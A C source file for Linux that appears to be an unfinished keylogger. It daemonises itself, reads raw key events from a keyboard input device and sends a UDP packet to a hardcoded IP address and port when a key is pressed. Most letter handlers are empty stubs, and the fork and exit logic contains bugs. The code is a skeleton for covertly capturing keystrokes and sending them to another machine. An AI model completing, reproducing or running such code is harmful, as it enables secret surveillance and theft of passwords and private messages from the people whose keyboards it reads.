#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <netinet/in.h>
#include <stddef.h>
#include <arpa/inet.h>
#include <sys/socket.h>


void udpsend(const char *message){
  int port = 9800;
  const char *ip = "192.168.100.18";
  
  //string ip to bytes
  struct sockaddr_in desti = {.sin_family = AF_INET, .sin_port = htons(port) };

  //the purpose of inet_pton is to cast the string ip to bytes input-event-codes
  if (inet_pton(AF_INET, ip, &(desti.sin_addr)) <= 0 ){     
    perror("SOMETHING WRONG WITH IP");
    exit(EXIT_FAILURE);
  }

  int udp = socket(AF_INET, SOCK_DGRAM, 0);
  if (udp < 0){
    perror("CANT CREATE SOCKET");
    exit(EXIT_FAILURE);
  }

  if (sendto(udp, message, strlen(message) + 1, 0,
      (struct sockaddr *)&desti, sizeof(desti)) < 0){
    perror("FAILED TO SEND PACKET");
    close(udp);
    exit(EXIT_FAILURE);
  }

  close(udp);
  exit(EXIT_SUCCESS);
}

void daemonisasi(){
  pid_t pid = fork();
  assert(pid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
  setsid();
  pid_t newpid = fork();
  assert(newpid != -1);
  if (pid > 0){
    exit(EXIT_SUCCESS);
  }
}

int main(int argc, char *argv[]){
  bool CAPS = false;
  char *event = argv[1];

  int fd = open(argv[1], O_RDONLY, 0);
  struct input_event ie;

  daemonisasi();
  while (1){
    read(fd, &ie,sizeof(ie));

    if (ie.type != EV_KEY){
      continue;
    }

    if (ie.value != 1 ){
      continue;
    }

    //i need to convert the integer ie.code variable into string
    if (ie.code > 1 && ie.code < 11){
      printf("the key num that is being pressed is %d\n", ie.code - 1 );
      continue;
    }

    else if(ie.code == 11 ){
      udpsend("0");
      continue;
    }


    else if (ie.code == KEY_CAPSLOCK){
      CAPS = true;
    } 

    //capslock logic
    if (CAPS){
      switch(ie.code){
        case KEY_A:
          break;
        case KEY_B:
          break;
        case KEY_C:
          break;
        case KEY_D:
          break;
        case KEY_E:
          break;
        case KEY_F:
          break;
        case KEY_G:
          break;
        case KEY_H:
          break;
        case KEY_I:
          break;
        case KEY_J:
          break;
        case KEY_K:
          break;
        case KEY_L:
          break;
        case KEY_M:
          break;
        case KEY_N:
          break;
        case KEY_O:
          break;
        case KEY_P:
          break;
        case KEY_Q:
          break;
        case KEY_R :
          break;
        case KEY_S :
          break;
        case KEY_T :
          break;
        case KEY_U :
          break;
        case KEY_V :
          break;
        case KEY_W :
          break;
        case KEY_X :
          break;
        case KEY_Y :
          break;
        case KEY_Z:
          break;
      }
    }
    else{
      switch(ie.code){
        case KEY_A:
          break;
        case KEY_B:
          break;
        case KEY_C:
          break;
        case KEY_D:
          break;
        case KEY_E:
          break;
        case KEY_F:
          break;
        case KEY_G:
          break;
        case KEY_H:
          break;
        case KEY_I:
          break;
        case KEY_J:
          break;
        case KEY_K:
          break;
        case KEY_L:
          break;
        case KEY_M:
          break;
        case KEY_N:
          break;
        case KEY_O:
          break;
        case KEY_P:
          break;
        case KEY_Q:
          break;
        case KEY_R :
          break;
        case KEY_S :
          break;
        case KEY_T :
          break;
        case KEY_U :
          break;
        case KEY_V :
          break;
        case KEY_W :
          break;
        case KEY_X :
          break;
        case KEY_Y :
          break;
        case KEY_Z:
          break;
      }
    }

    switch (ie.code) {
      case KEY_SEMICOLON:
        break;
      case KEY_COMMA:
        break;
      case KEY_DOT:
        break;
      case KEY_SLASH:
        break;
      case KEY_BACKSLASH:
        break;
      case KEY_SPACE:
        break;
      default:
        printf("UNKNOWN\n");
      }
    printf("%d\n",CAPS);

  }
}

